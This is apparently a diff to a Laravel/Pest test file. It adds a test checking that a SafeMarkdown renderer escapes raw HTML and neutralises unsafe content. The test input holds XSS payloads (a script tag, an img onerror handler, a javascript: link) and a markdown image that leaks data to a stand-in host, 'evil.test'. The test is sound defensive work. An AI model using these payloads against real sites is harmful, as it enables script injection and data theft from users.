@@ -8,6 +8,7 @@ use App\Models\ChatMessage;
 use App\Models\Machine;
 use App\Models\User;
 use App\Sharp\Entities\MachineEntity;
+use App\Support\SafeMarkdown;
 use Code16\Sharp\Utils\Testing\SharpAssertions;
 use Illuminate\Foundation\Testing\RefreshDatabase;
 use Illuminate\Support\Facades\Route;
@@ -105,4 +106,12 @@ it('emits streaming events to the callback and stores the final answer', functio
     expect($deltas)->toBe('Streamed answer.')
         ->and($run->status)->toBe('completed')
         ->and($run->report)->toBe('Streamed answer.');
+});
+
+it('renders markdown safely: formatting kept, raw html escaped, images and unsafe links neutralised', function () {
+    $html = SafeMarkdown::render("**bold** and `code`\n\n- one\n- two\n\n<script>alert(1)</script>\n\n<img src=x onerror=alert(1)>\n\n![t](https://evil.test/leak?d=secret)\n\n[bad](javascript:alert(1)) [ok](https://example.com)");
+
+    expect($html)->toContain('<strong>bold</strong>', '<code>code</code>', '<li>one</li>', 'href="https://example.com"', 'rel="')
+        ->not->toContain('<script', '<img', 'javascript:', 'evil.test/leak?')
+        ->toContain('&lt;script&gt;');
 });
